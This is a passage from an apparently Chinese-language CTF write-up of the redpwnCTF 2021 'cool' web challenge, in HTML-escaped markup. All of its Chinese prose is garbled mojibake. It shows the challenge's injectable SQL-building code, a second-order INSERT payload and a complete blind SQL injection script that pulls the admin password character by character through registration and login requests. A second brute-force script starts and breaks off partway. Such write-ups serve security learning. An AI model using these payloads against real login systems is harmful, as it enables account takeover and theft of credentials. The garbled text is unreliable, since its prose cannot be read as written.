&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽæ˜¯åœ¨åˆ›å»ºç”¨æˆ·&lt;code>create_user()&lt;/code>å’Œç™»å½•&lt;code>check_login()&lt;/code>æ—¶éƒ½ä¼šæ£€æµ‹ç”¨æˆ·åä¸­æ˜¯å¦æœ‰éžæ³•å­—ç¬¦ï¼ˆç™½åå•æ˜¯26ä¸ªè‹±æ–‡å­—æ¯å¤§å°å†™å’Œæ•°å­—ï¼‰ï¼Œç®—æ˜¯æŒºä¸¥æ ¼çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create_user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">allowed_characters&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Alphanumeric usernames only, please.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Username is too short.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Password is too long.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">other_users&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT * FROM users WHERE username=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">;&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other_users&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Username taken.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password)&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span> &lt;span style="color:#75715e"># passwdéƒ¨åˆ†å¯æŽ§&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€ƒè™‘äº†ä¸€ä¸‹äºŒæ¬¡æ³¨å…¥ï¼Œå› ä¸ºæ³¨å†Œæ—¶çš„passwdéƒ¨åˆ†å®Œå…¨å¯æŽ§ï¼Œè®¾æƒ³æ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710122622508.png" alt="image-20210710122622508">&lt;/p>
&lt;p>æž„é€ passwdéƒ¨åˆ†ä¸º &lt;code>'),('ginkoid','passwd&lt;/code>&lt;/p>
&lt;p>emmmm ä½†æ˜¯è¿™é‡Œä¸ç®¡æ˜¯æ˜Žæ–‡è¿˜æ˜¯url encodeéƒ½ä¼šæœ‰500é”™è¯¯ï¼Œè€Œä¸”è¿™é‡Œè¿”å›žçš„æ—¶&lt;code>correct_password[0][0]==password&lt;/code>ï¼Œä¹Ÿç®—æ˜¯æœç»äº†è¿™ç§å¤šæ·»åŠ ä¸€æ¡ä¿¡æ¯çš„å¯èƒ½ï¼Œä¹‹å‰å·²ç»åˆå§‹åŒ–çš„å¯†ç ä¼šæ˜¯&lt;code>[0][0]&lt;/code>ï¼Œè€Œæ–°æ’å…¥çš„passwdå°†æ˜¯&lt;code>[1][0]&lt;/code>ï¼›å¹¶ä¸”åœ¨&lt;code>init()&lt;/code>æ—¶å®šä¹‰usernameæ˜¯primary ä¹Ÿä¸å¯èƒ½æœ‰é‡å¤çš„&lt;/p>
&lt;p>â€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™å°±åœåˆ°è¿™é‡Œäº†ï¼Œä¹Ÿæ˜¯å½“æ—¶äº†è§£çš„å¤ªå°‘ï¼Œæ€è·¯å¾ˆå®¹æ˜“å°±æ–­æŽ‰äº†ã€‚ã€‚ã€‚ä»¥ä¸‹æ˜¯å¤çŽ°&lt;/p>
&lt;p>åœ¨çœ‹äº†&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">è¿™ç¯‡wp&lt;/a>ä¹‹åŽï¼Œå‘çŽ°è¿™ä½å¸ˆå‚…æœ€å¼€å§‹è·Ÿæˆ‘çš„æ€è·¯æ˜¯ä¸€æ ·çš„ éƒ½æƒ³åˆ©ç”¨inserté‚£ä¸€å¥ï¼Œéƒ½æƒ³æ›¿æ¢æŽ‰æ•°æ®åº“ä¸­åŽŸæ¥å­˜æœ‰çš„ginkoidçš„å¯†ç ï¼›è¿™ä½å¸ˆå‚…ç”¨çš„payloadæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­çš„&lt;code>ON CONFLICT DO UPDATE SET&lt;/code>ï¼Œåœ¨&lt;a href="https://www.sqlite.org/lang_UPSERT.html">è¿™ç¯‡å®˜æ–¹æ–‡æ¡£&lt;/a>é‡Œå†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™ä½å¸ˆå‚…ç»™çš„payloadå¾ˆå¥½ï¼ˆæˆ‘å½“æ—¶åˆ™å¯¹è¿™ä¸ªsqlè¯­å¥å¹¶ä¸æ¸…æ¥šï¼‰ä½†æ˜¯æ­£å¦‚ä»–æ‰€è¯´çš„ï¼Œwhich is 8 characters over the limit, which won&amp;rsquo;t do.&lt;/p>
&lt;p>æœ€åŽä½¿ç”¨ç›²æ³¨çš„æ–¹å¼ï¼Œå…ˆä¸Šä¸€ä¸‹è„šæœ¬ ï¼ˆ&lt;a href="https://github.com/SuperStormer/writeups/blob/master/redpwnctf_2021/web/cool.py">è¿™é‡Œæ˜¯æ¥æº&lt;/a>ï¼‰å†è¯´è¯´æ€è·¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://cool.mc.ax/&amp;#34;&lt;/span>
&lt;span style="color:#75715e"># url = &amp;#34;http://127.0.0.1:5000/&amp;#34;&lt;/span>
&lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;asdfjwfoijweoijfojiewfj&amp;#34;&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&amp;#34;&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">time_ns&lt;/span>&lt;span style="color:#111">())&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># æ³¨æ„ç™½åå•é‡Œæ²¡æœ‰0 è¦æ¢æŽ‰&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(select substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) from users)||&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;register&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">})&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">})&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;Incorrect&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨å…¥ç‚¹ä»ç„¶æ˜¯ä¸Šæ–‡æåˆ°çš„&lt;code>/register&lt;/code>è·¯ç”±ä¸­&lt;code>create_user(username,password)&lt;/code>ï¼ˆå½“æ—¶æ‰¾å¯¹äº†æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯ç›²æ³¨è¿™å—è¿˜æ˜¯åšçš„å°‘ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806085327316.png" alt="image-20210806085327316">&lt;/p>
&lt;p>ä¸»è¦çš„payloadæ˜¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(select substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) from users)||&amp;#39;&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸€å¥ï¼Œå½“è¿›å…¥åˆ°æ³¨å†Œæµç¨‹æ—¶ ä¼šæ‰§è¡Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">excute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password)&amp;#39;&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å³&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">excute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users(username, password)&amp;#39;&lt;/span> &lt;span style="color:#111">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxusernamexxxx&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">select&lt;/span> &lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">users&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­&lt;code>||&lt;/code>è¿žæŽ¥ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼›æ‰€ä»¥å‘é€æ³¨å†Œè¯·æ±‚æ—¶passwordçš„å€¼å°±æ˜¯åŽé¢çš„æŸ¥è¯¢è¯­å¥&lt;code>select substr(password,n,1) from users&lt;/code>ï¼Œè€ŒæŸ¥è¯¢è¯­å¥è¿”å›žçš„æ˜¯&lt;code>substr(password,n,1)&lt;/code> æ˜¯ginkoidè¿™ä¸ªè´¦æˆ·çš„å¯†ç çš„å…¶ä¸­ä¸€ä½ï¼Œè¦èŽ·å¾—è¿™ä¸ªå€¼å…·ä½“æ˜¯ä»€ä¹ˆ éœ€è¦å†æœ‰ä¸€ä¸ª&lt;code>for in _ in charset&lt;/code>éåŽ†ï¼Œåœ¨ç™»å½•å¤„ æŠŠè¿™ä¸ªå€¼ç»™è¯•å‡ºæ¥&lt;/p>
&lt;p>&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">è‹±æ–‡ç‰ˆè®²è§£&lt;/a>ï¼š&lt;em>The SELECT statement will take the character at index in ginkoid&amp;rsquo;s password, and concatenate it with &amp;lsquo;&amp;rsquo;, to be used as the new user&amp;rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.&lt;/em>&lt;/p>
&lt;p>èŽ·å¾—å¯†ç åŽä»¥ginkoidçš„è´¦å·ç™»å½•ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªmp3æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ä»€ä¹ˆæ‰€è°“çš„éšå†™ flagå°±åœ¨æŠ“åŒ…åŽå¯ä»¥çœ‹åˆ°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164749339.png" alt="image-20210713164749339">&lt;/p>
&lt;p>â€”â€”â€”â€”å…¶å®žè¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹ç–‘é—®ï¼Œä¸ºä»€ä¹ˆ&lt;code>select substr(password,n,1) from users&lt;/code>å°±èƒ½ç¡®ä¿æ˜¯ginoidçš„passwdå‘¢ï¼Ÿginkoidæ˜¯è¡¨ä¸­çš„ç¬¬ä¸€æ¡æ•°æ®ï¼Œåœ¨æ–°å»ºè¡¨åŽç«‹åˆ»æ’å…¥ï¼Œè¿™å°±å¯ä»¥ä¿è¯åœ¨æŸ¥è¯¢çš„æ—¶å€™åªæŸ¥ginkoidçš„å¯†ç å—ï¼Ÿ&lt;/p>
&lt;p>discordä¹‹å‰æœ‰äººé—®è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå½“æ—¶çš„è§£ç­”æ˜¯è¿™æ˜¯sqlliteçš„ç‰¹æ€§ï¼Œä½†æ˜¯ç”¨sqlliteåœ¨çº¿å·¥å…·å°è¯•åŽå‘çŽ°ä¹Ÿä¸æ˜¯è¿™æ ·çš„ ä¹Ÿä¼šè¿”å›žæ‰€æœ‰æ•°æ®çš„&lt;code>substr(x,x,x)&lt;/code>çš„å€¼ï¼Œä½†æ˜¯ç¡®å®žæ˜¯ç”¨è¿™æ ·çš„payloadèƒ½åšå‡ºæ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164423092.png" alt="image-20210713164423092">&lt;/p>
&lt;p>â€”â€”â€”â€”åŽæ¥æƒ³äº†ä¸€ä¸‹ æ˜¯è¿™é‡Œçš„&lt;code>return correct_password[0][0]==password&lt;/code> ç¡®ä¿äº†è™½ç„¶sqlæŸ¥è¯¢è¯­å¥è¿”å›žçš„æ˜¯å¾ˆå¤šä¸ªå•ä¸€å­—æ¯ï¼Œä½†æ˜¯æ˜¯å¤šè¡Œè¿”å›žï¼Œä»ç„¶åªä¼šå–åˆ°ç¬¬ä¸€ä¸ªï¼›å†åŠ ä¸Šusernameæ˜¯ä¸»é”® ç¬¬ä¸€ä¸ªæ’å…¥ï¼Œæ‰€ä»¥è¿™ä¸ªpayloadæ˜¯å¯ä»¥çš„&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716173434141.png" alt="image-20210716173434141">&lt;/p>
&lt;p>ä»¥ä¸€ä¸ªäº‹åŽè¯¸è‘›äº®çš„è§’åº¦æ¥çœ‹&lt;code>return correct_password[0][0]==password&lt;/code> è¿™å¥ä»£ç  å…¶å®žæœ‰æš—ç¤ºçš„æˆåˆ†åœ¨äº†&lt;/p>
&lt;p>â€”â€”â€”â€”è¿˜æœ‰å¦ä¸€ç‰ˆçš„è„šæœ¬ discordé‡Œæ”¶çš„&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716175415526.png" alt="image-20210716175415526.png">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>
&lt;span style="color:#111">allowed&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&amp;#39;&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;https://cool.mc.ax/&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;span style="color:#111">final&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">try_pass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ClientSession&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;Incorrect&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;password[&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">]: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">password&lt;/span>
